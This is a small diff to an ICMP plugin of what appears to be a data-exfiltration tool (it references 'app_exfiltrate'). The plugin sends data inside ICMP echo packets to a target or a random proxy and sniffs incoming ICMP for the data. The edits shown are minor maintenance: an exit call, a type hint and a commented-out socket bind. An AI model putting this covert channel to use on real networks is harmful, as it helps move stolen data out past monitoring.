@@ -11,7 +11,7 @@ def send_icmp(dst, data):
         s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
     except:
         app_exfiltrate.log_message('warning', "ICMP plugin requires root privileges")
-        sys.exit()
+        exit(1)
     ip_dst = socket.gethostbyname(dst)
     echo = icmp.ICMP.Echo()
     echo.id = randint(0, 0xffff)
@@ -27,7 +27,7 @@ def send_icmp(dst, data):
         pass
     s.close()
 
-def send(data):
+def send(data: str):
     if 'proxies' in config and config['proxies'] != [""]:
         targets = [config['target']] + config['proxies']
         target = choice(targets)
@@ -47,7 +47,7 @@ def listen():
 def sniff(handler):
     """ Sniffs packets and looks for icmp requests """
     sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-    sock.bind(('', 1))
+    # sock.bind(('', 1))
     while True :
         try:
             data = sock.recv(65535)
